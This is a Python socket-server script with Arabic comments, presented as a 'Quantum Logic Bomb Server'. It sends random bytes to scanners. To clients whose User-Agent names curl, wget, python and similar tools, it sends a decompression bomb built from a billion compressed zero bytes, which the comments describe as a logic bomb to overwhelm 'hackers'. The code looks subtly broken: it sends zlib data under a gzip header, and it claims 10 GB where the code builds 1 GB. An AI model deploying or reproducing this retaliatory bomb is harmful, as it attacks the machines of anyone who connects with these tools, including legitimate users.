import socket
import os
import threading
import zlib

PORT = 8080
PUBLIC_DIR = "public"

# قنبلة منطقية: بيانات مضغوطة تتحول لـ 10 جيجابايت عند محاولة فتحها
BOMB_DATA = zlib.compress(b"0" * 10**9) # قنبلة وهمية

def handle_client(client, addr):
    try:
        request = client.recv(4096).decode('utf-8', errors='ignore')
        
        # 1. منع الفحص (Nmap/Scanners): إذا لم يكن طلباً حقيقياً، اصعقه فوراً
        if "HTTP" not in request:
            client.send(os.urandom(1024))
            client.close()
            return

        # 2. القنبلة المنطقية: إذا حاول الهكر استخدام أدوات سحب (Python-requests, wget, curl)
        user_agent = ""
        for line in request.split('\n'):
            if "User-Agent" in line:
                user_agent = line.lower()
        
        # إذا اكتشف أداة سحب تلقائية
        if any(tool in user_agent for tool in ["python", "curl", "wget", "go-http", "libwww"]):
            print(f"💣 Logic Bomb Triggered for {addr[0]}!")
            response = "HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n"
            client.send(response.encode() + BOMB_DATA)
            client.close()
            return

        # 3. عرض الموقع للمستخدم الطبيعي
        with open(f"{PUBLIC_DIR}/index.html", "r") as f:
            content = f.read()
        response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" + content
        client.send(response.encode())
    except:
        pass
    finally:
        client.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PORT))
    server.listen(1000)
    print("💎 Quantum Logic Bomb Server is ACTIVE. Invisible & Deadly.")
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client, addr)).start()

if __name__ == "__main__":
    start_server()

